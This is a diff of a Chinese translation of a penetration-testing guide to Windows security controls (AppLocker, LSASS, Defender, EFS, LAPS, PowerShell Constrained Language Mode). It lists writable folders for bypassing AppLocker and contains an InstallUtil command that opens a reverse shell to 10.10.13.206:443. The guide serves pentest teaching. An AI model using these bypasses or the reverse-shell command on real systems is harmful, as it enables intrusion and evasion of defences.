@@ -4,7 +4,7 @@
 
 ## AppLocker Policy
 
-应用程序白名单是一个经过批准的软件应用程序或可执行文件的列表，这些软件被允许在系统上存在和运行。其目标是保护环境免受有害恶意软件和不符合组织特定业务需求的未批准软件的影响。
+应用程序白名单是一个经过批准的软件应用程序或可执行文件的列表，这些软件被允许存在并在系统上运行。其目标是保护环境免受有害恶意软件和不符合组织特定业务需求的未批准软件的影响。
 
 [AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) 是微软的 **应用程序白名单解决方案**，为系统管理员提供了对 **用户可以运行哪些应用程序和文件** 的控制。它提供了对可执行文件、脚本、Windows 安装程序文件、DLL、打包应用程序和打包应用程序安装程序的 **细粒度控制**。\
 组织通常会 **阻止 cmd.exe 和 PowerShell.exe** 以及对某些目录的写入访问，**但这一切都可以被绕过**。
@@ -26,7 +26,7 @@ $a.rulecollections
 
 ### 绕过
 
-- 有用的 **可写文件夹** 以绕过 AppLocker 策略：如果 AppLocker 允许在 `C:\Windows\System32` 或 `C:\Windows` 内执行任何内容，则可以使用 **可写文件夹** 来 **绕过此限制**。
+- 有用的 **可写文件夹** 用于绕过 AppLocker 策略：如果 AppLocker 允许在 `C:\Windows\System32` 或 `C:\Windows` 内执行任何内容，则可以使用 **可写文件夹** 来 **绕过此限制**。
 ```
 C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
 C:\Windows\System32\spool\drivers\color
@@ -48,9 +48,9 @@ C:\windows\tracing
 
 ### 本地安全机构 (LSA) - LSASS
 
-**凭据**（哈希）被 **保存** 在此子系统的 **内存** 中，以实现单点登录。\
+**凭据**（哈希）被 **保存** 在此子系统的 **内存** 中，以实现单点登录的目的。\
 **LSA** 管理本地 **安全策略**（密码策略、用户权限...）、**身份验证**、**访问令牌**...\
-LSA 将是 **检查** 提供的凭据的 **SAM** 文件（用于本地登录）并 **与** **域控制器** 进行通信以验证域用户。
+LSA 将是 **检查** 提供的凭据是否在 **SAM** 文件中（用于本地登录）并 **与** **域控制器** 进行通信以验证域用户的主体。
 
 **凭据** 被 **保存** 在 **进程 LSASS** 中：Kerberos 票证、NT 和 LM 哈希、易于解密的密码。
 
@@ -69,7 +69,7 @@ LSA 可能会在磁盘上保存一些凭据：
 
 ## Defender
 
-[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) 是 Windows 10 和 Windows 11 以及 Windows Server 版本中可用的防病毒软件。它 **阻止** 常见的渗透测试工具，如 **`WinPEAS`**。但是，有绕过这些保护的方法。
+[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) 是 Windows 10 和 Windows 11 以及 Windows Server 版本中可用的防病毒软件。它 **阻止** 常见的渗透测试工具，如 **`WinPEAS`**。然而，有方法可以 **绕过这些保护**。
 
 ### 检查
 
@@ -121,7 +121,7 @@ EFS 通过加密保护文件，使用称为 **文件加密密钥 (FEK)** 的 **�
 
 ### 检查 EFS 信息
 
-检查 **用户** 是否 **使用** 了此 **服务**，检查此路径是否存在：`C:\users\<username>\appdata\roaming\Microsoft\Protect`
+检查 **用户** 是否 **使用** 该 **服务**，检查此路径是否存在：`C:\users\<username>\appdata\roaming\Microsoft\Protect`
 
 使用 cipher /c \<file\> 检查 **谁** 有 **访问** 文件的权限\
 您还可以在文件夹内使用 `cipher /e` 和 `cipher /d` 来 **加密** 和 **解密** 所有文件
@@ -133,6 +133,7 @@ EFS 通过加密保护文件，使用称为 **文件加密密钥 (FEK)** 的 **�
 这种方式要求 **受害者用户** 在主机内 **运行** 一个 **进程**。如果是这种情况，使用 `meterpreter` 会话可以模拟用户进程的令牌（`impersonate_token` 来自 `incognito`）。或者您可以直接 `migrate` 到用户的进程。
 
 #### 知道用户的密码
+
 
 {{#ref}}
 https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
@@ -148,7 +149,7 @@ https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
 - **计划任务能力**：与管理服务账户不同，gMSA 支持运行计划任务。
 - **简化 SPN 管理**：当计算机的 sAMaccount 详细信息或 DNS 名称发生更改时，系统会自动更新服务主体名称 (SPN)，简化 SPN 管理。
 
-gMSA 的密码存储在 LDAP 属性 _**msDS-ManagedPassword**_ 中，并由域控制器 (DC) 每 30 天自动重置。此密码是一个加密数据块，称为 [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)，只能由授权管理员和安装 gMSA 的服务器检索，确保了安全环境。要访问此信息，需要安全连接，如 LDAPS，或连接必须经过 'Sealing & Secure' 认证。
+gMSA 的密码存储在 LDAP 属性 _**msDS-ManagedPassword**_ 中，并由域控制器 (DC) 每 30 天自动重置。此密码是一个加密数据块，称为 [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)，只能由授权管理员和安装 gMSA 的服务器检索，从而确保安全环境。要访问此信息，需要安全连接，例如 LDAPS，或者连接必须经过 'Sealing & Secure' 认证。
 
 ![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)
 
@@ -162,7 +163,7 @@ gMSA 的密码存储在 LDAP 属性 _**msDS-ManagedPassword**_ 中，并由域�
 
 ## LAPS
 
-**本地管理员密码解决方案 (LAPS)**，可从[Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899)下载，允许管理本地管理员密码。这些密码是**随机的**、唯一的，并且**定期更改**，集中存储在Active Directory中。对这些密码的访问通过ACL限制为授权用户。授予足够的权限后，可以读取本地管理员密码。
+**本地管理员密码解决方案 (LAPS)**，可从[Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899)下载，允许管理本地管理员密码。这些密码是**随机生成**、唯一且**定期更改**的，集中存储在Active Directory中。对这些密码的访问通过ACL限制为授权用户。授予足够的权限后，可以读取本地管理员密码。
 
 {{#ref}}
 active-directory-methodology/laps.md
@@ -170,7 +171,7 @@ active-directory-methodology/laps.md
 
 ## PS受限语言模式
 
-PowerShell [**受限语言模式**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **锁定了许多**有效使用PowerShell所需的功能，例如阻止COM对象，仅允许批准的.NET类型、基于XAML的工作流、PowerShell类等。
+PowerShell [**受限语言模式**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **锁定了许多有效使用PowerShell所需的功能**，例如阻止COM对象，仅允许批准的.NET类型、基于XAML的工作流、PowerShell类等。
 
 ### **检查**
 ```bash
@@ -193,7 +194,7 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogTo
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
 ```
-您可以使用 [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 或 [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 来 **执行 Powershell** 代码在任何进程中并绕过受限模式。有关更多信息，请查看: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)。
+您可以使用 [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 或 [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 在任何进程中 **执行 Powershell** 代码并绕过受限模式。有关更多信息，请查看: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)。
 
 ## PS 执行策略
 
@@ -227,15 +228,15 @@ SSPI 将负责为想要通信的两台机器找到合适的协议。首选方法
 
 ### 主要 SSP
 
-- **Kerberos**：首选
+- **Kerberos**: 首选
 - %windir%\Windows\System32\kerberos.dll
-- **NTLMv1** 和 **NTLMv2**：出于兼容性原因
+- **NTLMv1** 和 **NTLMv2**: 兼容性原因
 - %windir%\Windows\System32\msv1_0.dll
-- **Digest**：Web 服务器和 LDAP，密码以 MD5 哈希形式存在
+- **Digest**: Web 服务器和 LDAP，密码以 MD5 哈希形式存在
 - %windir%\Windows\System32\Wdigest.dll
-- **Schannel**：SSL 和 TLS
+- **Schannel**: SSL 和 TLS
 - %windir%\Windows\System32\Schannel.dll
-- **Negotiate**：用于协商使用的协议（Kerberos 或 NTLM，默认是 Kerberos）
+- **Negotiate**: 用于协商使用的协议（Kerberos 或 NTLM，默认是 Kerberos）
 - %windir%\Windows\System32\lsasrv.dll
 
 #### 协商可能提供多种方法或仅提供一种。
